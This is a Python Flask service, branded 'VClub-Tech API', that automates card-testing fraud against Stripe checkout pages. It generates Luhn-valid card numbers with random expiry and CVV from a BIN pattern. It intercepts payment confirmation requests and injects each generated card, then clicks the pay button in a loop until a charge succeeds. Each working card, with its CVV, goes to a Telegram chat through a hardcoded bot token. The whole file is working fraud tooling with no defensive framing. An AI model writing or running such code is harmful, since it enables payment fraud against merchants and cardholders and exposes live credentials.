import os
import asyncio
import requests
import json
import random
import time
import threading
from datetime import datetime
from playwright.async_api import async_playwright, Error as PlaywrightError
from flask import Flask, request, jsonify

# --- 1. CONFIGURATION ---
# These values are loaded from environment variables, which you will set on your hosting platform (e.g., Render).
BROWSERLESS_API_KEY = os.getenv('BROWSERLESS_API_KEY')
BOT_TOKEN = os.getenv('BOT_TOKEN', '7212733015:AAFtgLgIFEfTFHbyd-095DtnSezkExUA8fU')
DEFAULT_CHAT_ID = os.getenv('DEFAULT_CHAT_ID', '-1003067380709')

# This is a crucial check to prevent the app from starting without the required key.
if not BROWSERLESS_API_KEY:
    raise ValueError("FATAL: BROWSERLESS_API_KEY environment variable is not set!")

# --- 2. CARD GENERATION & TELEGRAM LOGIC (Unchanged) ---

def luhn_algorithm(number_str):
    total = 0
    reverse_digits = number_str[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if (i % 2) == 1: n = n * 2 - 9 if n > 4 else n * 2
        total += n
    return total % 10 == 0

def complete_luhn(base):
    for d in range(10):
        candidate = base + str(d)
        if luhn_algorithm(candidate): return candidate
    return None

def get_card_length(bin_str): return 15 if bin_str[:2] in ['34', '37'] else 16
def get_cvv_length(card_number): return 4 if len(card_number) == 15 else 3
def random_digit(): return str(random.randint(0, 9))

def generate_card_from_pattern(pattern):
    card_length = get_card_length(pattern.replace('x', '0'))
    base = ''.join([random_digit() if c == 'x' else c for c in pattern])
    while len(base) < card_length - 1: base += random_digit()
    base = base[:card_length - 1]
    return complete_luhn(base) or base + '0'

def process_card_with_placeholders(number, month, year, cvv):
    processed_number = generate_card_from_pattern(number) if 'x' in number else number
    processed_month = str(random.randint(1, 12)).zfill(2) if 'x' in month.lower() else month.zfill(2)
    current_year = datetime.now().year
    processed_year = str(random.randint(current_year + 1, current_year + 8)) if 'x' in year.lower() else ('20' + year if len(year) == 2 else year)
    cvv_length = get_cvv_length(processed_number)
    processed_cvv = ''.join([random_digit() for _ in range(cvv_length)]) if 'x' in cvv.lower() else cvv
    return {"number": processed_number, "month": processed_month, "year": processed_year, "cvv": processed_cvv}

def get_card(target_bin):
    parts = target_bin.split('|')
    return process_card_with_placeholders(*parts) if len(parts) == 4 else None

def send_telegram_message(chat_id, message):
    print(f"\n--- TELEGRAM ---\n{message}\n----------------\n")
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, params={'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML'}, timeout=10)
    except Exception as e:
        print(f"[ERROR] Could not send Telegram message: {e}")

# --- 3. THE CORE BROWSER AUTOMATION TASK ---

def run_automation_task(target_url, target_bin):
    """The main Playwright logic, designed to run in a background thread."""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    task_state = {'success_found': False, 'attempts': 0, 'current_card': None}

    async def perform_automation():
        print(f"[{threading.get_ident()}] Starting automation task for {target_url}")
        async with async_playwright() as p:
            browser = None
            try:
                print(f"[{threading.get_ident()}] Connecting to Browserless.io...")
                browserless_url = f"wss://chrome.browserless.io?token={BROWSERLESS_API_KEY}"
                # Increase timeout for connecting to remote browser
                browser = await p.chromium.connect_over_cdp(browserless_url, timeout=120000)
                print(f"[{threading.get_ident()}] Browser connected successfully.")
            except Exception as e:
                print(f"[{threading.get_ident()}] FATAL: Could not connect to browser. Check API Key/Network. Error: {e}")
                return

            context = await browser.new_context(user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36')
            page = await context.new_page()

            async def handle_stripe_post(route):
                card_details = get_card(target_bin)
                if not card_details:
                    await route.abort()
                    return
                
                task_state['current_card'] = card_details
                task_state['attempts'] += 1
                print(f"[{threading.get_ident()} | Attempt #{task_state['attempts']}] Intercepting POST. Injecting Card: {card_details['number']}")
                
                post_data_str = route.request.post_data or ""
                form_data = {k: v for k, v in (x.split('=', 1) for x in post_data_str.split('&') if '=' in x)}
                form_data.update({
                    'card[number]': card_details['number'], 'card[exp_month]': card_details['month'],
                    'card[exp_year]': card_details['year'], 'card[cvc]': card_details['cvv'],
                    'email': 'test.email.vclub@example.com'
                })
                await route.continue_(post_data=form_data)

            async def handle_response(response):
                if "stripe.com" in response.url and response.request.method == "POST":
                    try:
                        data = await response.json()
                        card_details = task_state['current_card']
                        print(f"[{threading.get_ident()}] RESPONSE from Stripe: {json.dumps(data, indent=2)}")
                        is_success = data.get('status') == 'succeeded' or data.get('payment_intent', {}).get('status') == 'succeeded'
                        
                        if is_success:
                            print(f"[{threading.get_ident()}] ✅✅✅ PAYMENT SUCCESS! ✅✅✅")
                            task_state['success_found'] = True
                            amount = data.get('amount', 0) / 100
                            message = f"✅ HIT DETECTED\n━━━━━━━━━━━━━━━━━━━━\n💳 Card: {card_details['number']}|{card_details['month']}|{card_details['year']}|{card_details['cvv']}\n💰 Amount: ${amount:.2f}\n🔄 Attempts: {task_state['attempts']}\n━━━━━━━━━━━━━━━━━━━━\n🔋 Powered By: VClub-Tech API"
                            send_telegram_message(DEFAULT_CHAT_ID, message)
                        elif 'error' in data:
                            print(f"[{threading.get_ident()}] ❌ Declined: {data['error'].get('message', 'Unknown error')}")
                    except Exception: pass
            
            await page.route("**/v1/payment_intents/**/confirm", handle_stripe_post)
            page.on("response", handle_response)
            
            try:
                await page.goto(target_url, wait_until="networkidle", timeout=60000)
                print(f"[{threading.get_ident()}] Page loaded: {page.title()}")
            except PlaywrightError as e:
                print(f"[{threading.get_ident()}] FATAL: Failed to navigate to page. Error: {e}")
                await browser.close()
                return

            while not task_state['success_found']:
                try:
                    # This is a robust selector that tries multiple common patterns for the pay button.
                    submit_button_selector = '.SubmitButton, button[type="submit"], #submit, button:has-text("Pay")'
                    await page.locator(submit_button_selector).first.click(timeout=15000)
                    print(f"[{threading.get_ident()}] Clicked submit button. Waiting for response...")
                    await asyncio.sleep(5)
                except PlaywrightError as e:
                    print(f"[{threading.get_ident()}] ERROR: Could not click button or timed out. Site may have changed or shows CAPTCHA. Reloading. Error: {e}")
                    await page.reload(wait_until="networkidle")
            
            print(f"[{threading.get_ident()}] Task complete. Closing browser.")
            await browser.close()
    
    loop.run_until_complete(perform_automation())

# --- 4. FLASK API DEFINITION ---
app = Flask(__name__)

@app.route('/')
def index():
    return "VClub-Tech API is running. Use the /start-automation endpoint to start a task.", 200

@app.route('/start-automation', methods=['POST'])
def start_automation_endpoint():
    print("\n" + "="*50)
    print(f"API CALL RECEIVED at {datetime.now().isoformat()}")
    
    data = request.get_json()
    if not data or 'url' not in data or 'bin' not in data:
        return jsonify({"status": "error", "message": "Missing 'url' or 'bin' in request body."}), 400

    target_url = data['url']
    target_bin = data['bin']
    
    print(f"Received params: URL={target_url}, BIN={target_bin}")

    # Start the automation task in a background thread to prevent HTTP timeouts.
    automation_thread = threading.Thread(target=run_automation_task, args=(target_url, target_bin))
    automation_thread.start()

    print(f"Started background thread {automation_thread.ident} for URL: {target_url}")
    print("="*50 + "\n")
    
    return jsonify({
        "status": "success",
        "message": "Automation task started in the background. Results will be sent to Telegram.",
        "thread_id": automation_thread.ident
    }), 202

# The `if __name__ == '__main__':` block is not strictly necessary when using Gunicorn,
# but it's good practice for local testing.
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5001))
    print(f"Starting Flask development server on host 0.0.0.0 port {port}...")
    app.run(host='0.0.0.0', port=port)
